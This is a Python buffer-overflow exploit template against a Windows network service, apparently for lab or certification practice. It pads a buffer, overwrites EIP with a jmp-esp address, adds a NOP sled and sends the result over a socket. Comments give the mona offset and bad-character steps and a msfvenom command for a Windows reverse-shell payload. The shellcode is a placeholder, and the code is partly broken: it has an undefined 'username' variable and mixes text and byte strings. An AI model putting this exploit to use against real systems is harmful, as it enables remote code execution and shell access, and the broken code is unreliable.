#!/bin/python

import socket
import sys

# !mona config -set workingfolder C:\mona\%p

offset = b"A"*2012                              #               !mona findmsp -distance [length]
                                                #                               /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [length]
                                                # bad chars             !mona bytearray -b "\x00", !mona compare -f C:\mona\[binaryName]\bytearray.bin -a ESP
                                                # offset+BBBB+bad chars
eip = "\xdf\x14\x50\x62"        # jmp esp         !mona jmp -r esp -cpb [badChars], Little Endian (backwords)
                                                # buf = offset + eip + nops + payload
nops = "\x90"*32                # nops

# msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -b "\x00" -f py/c
buf = offset + eip + nops
buf += b"BUFFER GOES HERE"
buf += b"BUFFER GOES HERE"


# Modify the number of s.recv accordingly.
try:
        print("connecting...")
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('IP', PORT))
        s.recv(1024)
        s.recv(1024)
        print("connection successful")

        print("sending stuff...")
        s.send(username + b'\r\n')
        s.recv(1024)
        print("delivery successful")

        print("sending the buffer")
        s.send(buf + b'\r\n')
        print("the buffer sent")
        s.close()

except:
        print("fail")
        sys.exit()
